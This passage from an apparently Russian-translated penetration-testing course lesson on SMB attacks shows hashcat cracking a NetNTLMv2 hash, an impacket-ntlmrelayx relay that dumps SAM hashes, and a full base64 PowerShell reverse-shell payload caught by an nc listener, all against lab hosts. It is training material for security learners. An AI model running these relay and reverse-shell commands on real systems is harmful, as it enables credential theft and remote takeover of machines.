Hash.Name........: NetNTLMv2
Hash.Target......: ADMINISTRATOR::WIN-487IMQOIA8E:997b18cc61099ba2:3cc...000000
Time.Started.....: Mon Apr 11 16:49:34 2022 (1 sec)
Time.Estimated...: Mon Apr 11 16:49:35 2022 (0 secs)
Guess.Base.......: File (/usr/share/wordlists/rockyou.txt)
Guess.Queue......: 1/1 (100.00%)
Speed.#1.........:  1122.4 kH/s (1.34ms) @ Accel:1024 Loops:1 Thr:1 Vec:8
Recovered........: 1/1 (100.00%) Digests
Progress.........: 75776/14344386 (0.53%)
Rejected.........: 0/75776 (0.00%)
Restore.Point....: 73728/14344386 (0.51%)
Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:0-1
Candidates.#1....: compu -> kodiak1

Started: Mon Apr 11 16:49:34 2022
Stopped: Mon Apr 11 16:49:37 2022
```

Хэш NTLMv2 был взломан. Пароль: `P@ssword`. Если нам не удастся взломать хэш, мы потенциально можем переслать захваченный хэш на другую машину, используя [impacket-ntlmrelayx](https://github.com/SecureAuthCorp/impacket/blob/master/examples/ntlmrelayx.py) или Responder [MultiRelay.py](https://github.com/lgandx/Responder/blob/master/tools/MultiRelay.py) . Давайте рассмотрим пример с использованием `impacket-ntlmrelayx`.

Во-первых, нам нужно установить SMB `OFF`в файле конфигурации нашего ответчика ( `/etc/responder/Responder.conf`).

  Атака на SMB

```shell-session
MuraMitchi@htb[/htb]$ cat /etc/responder/Responder.conf | grep 'SMB ='

SMB = Off
```

Затем мы выполняем команду `impacket-ntlmrelayx`с опцией `--no-http-server`, `-smb2support`, а на целевой машине — с опцией `-t`. По умолчанию `impacket-ntlmrelayx`будет создан дамп базы данных SAM, но мы можем выполнять команды, добавив опцию `-c`.

  Атака на SMB

```shell-session
MuraMitchi@htb[/htb]$ impacket-ntlmrelayx --no-http-server -smb2support -t 10.10.110.146

Impacket v0.9.22 - Copyright 2020 SecureAuth Corporation

<SNIP>

[*] Running in relay mode to single host
[*] Setting up SMB Server
[*] Setting up WCF Server

[*] Servers started, waiting for connections

[*] SMBD-Thread-3: Connection from /ADMINISTRATOR@10.10.110.1 controlled, attacking target smb://10.10.110.146
[*] Authenticating against smb://10.10.110.146 as /ADMINISTRATOR SUCCEED
[*] SMBD-Thread-3: Connection from /ADMINISTRATOR@10.10.110.1 controlled, but there are no more targets left!
[*] SMBD-Thread-5: Connection from /ADMINISTRATOR@10.10.110.1 controlled, but there are no more targets left!
[*] Service RemoteRegistry is in stopped state
[*] Service RemoteRegistry is disabled, enabling it
[*] Starting service RemoteRegistry
[*] Target system bootKey: 0xeb0432b45874953711ad55884094e9d4
[*] Dumping local SAM hashes (uid:rid:lmhash:nthash)
Administrator:500:aad3b435b51404eeaad3b435b51404ee:2b576acbe6bcfda7294d6bd18041b8fe:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
WDAGUtilityAccount:504:aad3b435b51404eeaad3b435b51404ee:92512f2605074cfc341a7f16e5fabf08:::
demouser:1000:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
test:1001:aad3b435b51404eeaad3b435b51404ee:2b576acbe6bcfda7294d6bd18041b8fe:::
[*] Done dumping SAM hashes for host: 10.10.110.146
[*] Stopping service RemoteRegistry
[*] Restoring the disabled state for service RemoteRegistry
```

Мы можем создать обратную оболочку PowerShell, используя [https://www.revshells.com/](https://www.revshells.com/) , указав IP-адрес нашей машины, порт и опцию Powershell #3 (Base64).

  Атака на SMB

```shell-session
MuraMitchi@htb[/htb]$ impacket-ntlmrelayx --no-http-server -smb2support -t 192.168.220.146 -c 'powershell -e JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQA5ADIALgAxADYAOAAuADIAMgAwAC4AMQAzADMAIgAsADkAMAAwADEAKQA7ACQAcwB0AHIAZQBhAG0AIAA9ACAAJABjAGwAaQBlAG4AdAAuAEcAZQB0AFMAdAByAGUAYQBtACgAKQA7AFsAYgB5AHQAZQBbAF0AXQAkAGIAeQB0AGUAcwAgAD0AIAAwAC4ALgA2ADUANQAzADUAfAAlAHsAMAB9ADsAdwBoAGkAbABlACgAKAAkAGkAIAA9ACAAJABzAHQAcgBlAGEAbQAuAFIAZQBhAGQAKAAkAGIAeQB0AGUAcwAsACAAMAAsACAAJABiAHkAdABlAHMALgBMAGUAbgBnAHQAaAApACkAIAAtAG4AZQAgADAAKQB7ADsAJABkAGEAdABhACAAPQAgACgATgBlAHcALQBPAGIAagBlAGMAdAAgAC0AVAB5AHAAZQBOAGEAbQBlACAAUwB5AHMAdABlAG0ALgBUAGUAeAB0AC4AQQBTAEMASQBJAEUAbgBjAG8AZABpAG4AZwApAC4ARwBlAHQAUwB0AHIAaQBuAGcAKAAkAGIAeQB0AGUAcwAsADAALAAgACQAaQApADsAJABzAGUAbgBkAGIAYQBjAGsAIAA9ACAAKABpAGUAeAAgACQAZABhAHQAYQAgADIAPgAmADEAIAB8ACAATwB1AHQALQBTAHQAcgBpAG4AZwAgACkAOwAkAHMAZQBuAGQAYgBhAGMAawAyACAAPQAgACQAcwBlAG4AZABiAGEAYwBrACAAKwAgACIAUABTACAAIgAgACsAIAAoAHAAdwBkACkALgBQAGEAdABoACAAKwAgACIAPgAgACIAOwAkAHMAZQBuAGQAYgB5AHQAZQAgAD0AIAAoAFsAdABlAHgAdAAuAGUAbgBjAG8AZABpAG4AZwBdADoAOgBBAFMAQwBJAEkAKQAuAEcAZQB0AEIAeQB0AGUAcwAoACQAcwBlAG4AZABiAGEAYwBrADIAKQA7ACQAcwB0AHIAZQBhAG0ALgBXAHIAaQB0AGUAKAAkAHMAZQBuAGQAYgB5AHQAZQAsADAALAAkAHMAZQBuAGQAYgB5AHQAZQAuAEwAZQBuAGcAdABoACkAOwAkAHMAdAByAGUAYQBtAC4ARgBsAHUAcwBoACgAKQB9ADsAJABjAGwAaQBlAG4AdAAuAEMAbABvAHMAZQAoACkA'
```

После аутентификации жертвы на нашем сервере мы отравляем ответ и заставляем её выполнить нашу команду для получения обратной оболочки.

  Атака на SMB

```shell-session
MuraMitchi@htb[/htb]$ nc -lvnp 9001

listening on [any] 9001 ...
connect to [10.10.110.133] from (UNKNOWN) [10.10.110.146] 52471

PS C:\Windows\system32> whoami;hostname

nt authority\system
WIN11BOX
```

#### РПК

В [модуле «Сбор информации о машине»](https://academy.hackthebox.com/course/preview/footprinting) мы обсуждаем, как перечислить машины с помощью RPC. Помимо перечисления, мы можем использовать RPC для внесения изменений в систему, например:

- Изменить пароль пользователя.
- Создайте нового пользователя домена.
- Создайте новую общую папку.

В [модуле «Перечисление и атаки на Active Directory»](https://academy.hackthebox.com/course/preview/active-directory-enumeration--attacks) мы также рассматриваем перечисление с использованием RPC .

Следует помнить, что для внесения подобных изменений через RPC требуются определенные настройки. Для более подробного изучения этого вопроса можно испол